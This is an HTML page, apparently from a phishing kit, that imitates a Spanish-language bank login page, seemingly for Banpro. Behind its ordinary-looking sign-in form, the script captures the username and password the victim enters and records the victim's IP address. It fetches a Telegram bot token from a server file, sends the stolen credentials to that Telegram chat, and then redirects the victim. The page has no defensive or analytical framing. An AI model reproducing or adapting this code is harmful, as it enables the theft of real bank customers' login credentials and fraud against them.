<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inicie Sesión</title>
</head>
<body>
<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    #error-message {
        color: red;
        font-size: 14px;
        display: none;
        position: absolute;
        top: 420px;
        left: 30px;
    }
</style>

<div id="main-cnt" style="overflow: hidden; min-height:100vh; position: relative;">
    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="frmc" style="display:inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
            <form id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
               
 
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)">
                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                <input type="submit" value="Inicie Sesión"
                       style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
                       <p id="error-message" style="font-family: sans-serif;">Usuario o contraseña incorrectos</p>
                    </form>
        </div>
        <div id="bnncont" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    @media screen and (max-width:1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #ctn {
            border-radius: 6px !important;
        }
        #main-cnt {
            text-align: center !important;
            padding-top: 30px;
        }
        #frmc {
            width: 100% !important;
        }
        #bnncont {
            display: none !important;
        }
    }
</style>

<script>
    // Evitar espacios en el campo de usuario
    function noEspacios(event) {
        if (event.key === " ") {
            return false;
        }
    }

    // Validar contraseña
    function validarContrasena(contrasena) {
        const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!#$%&()*+,\-.\/:><=\\{}|¡])[A-Za-z\d!#$%&()*+,\-.\/:><=\\{}|¡]{8,32}$/;
        return regex.test(contrasena);
    }

    // Mostrar mensaje de error
    function mostrarError() {
        const errorMessage = document.getElementById("error-message");
        errorMessage.style.display = "block";

        setTimeout(() => {
            errorMessage.style.display = "none";
        }, 3000);
    }

    document.addEventListener("DOMContentLoaded", function() {
        // Evento de envío del formulario
        document.getElementById("f1").addEventListener("submit", function(event) {
            event.preventDefault();

            // Obtener los valores ingresados en el formulario
            const usuario = document.getElementById("i1").value;
            const contrasena = document.getElementById("i2").value;

            // Validar la contraseña
            if (!validarContrasena(contrasena)) {
                mostrarError();
                return;
            }

            // Obtener la IP y el token, luego enviar el mensaje a Telegram
            Promise.all([obtenerToken(), obtenerIP()])
                .then(results => {
                    const data = results[0];
                    const ip = results[1];

                    if (data && data.token && data.chat_id) {
                        const msg = `BANPRO LOGIN> IP: ${ip} - Usuario: ${usuario} - Contraseña: ${contrasena}`;
                        enviarMensajeTelegram(data.token, data.chat_id, msg);
                    }
                })
                .catch(error => {
                    console.error('Error durante el proceso:', error);
                });
        });

        // Función para obtener el token y el chat ID desde sax.php
        function obtenerToken() {
            return fetch('sax.php')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    if (data && typeof data === 'object') {
                        return {
                            token: data.token,
                            chat_id: data.chat_id
                        };
                    } else {
                        throw new Error('Formato de respuesta inválido');
                    }
                })
                .catch(error => {
                    console.error('Error al obtener el token:', error);
                });
        }

        // Función para obtener la IP del cliente
        function obtenerIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error al obtener la IP:', error);
                    return 'No disponible';
                });
        }

        // Función para enviar un mensaje a Telegram
        function enviarMensajeTelegram(token, chat_id, mensaje) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const params = {
                chat_id: chat_id,
                text: mensaje
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Ocurrió un error al enviar el mensaje.');
                }
                console.log('Mensaje enviado con éxito.');
                // Redirigir después de enviar el mensaje
                window.location.href = '2.html';
            })
            .catch(error => {
                console.error('Error al enviar el mensaje:', error);
            });
        }
    });
</script>
</body>
</html>
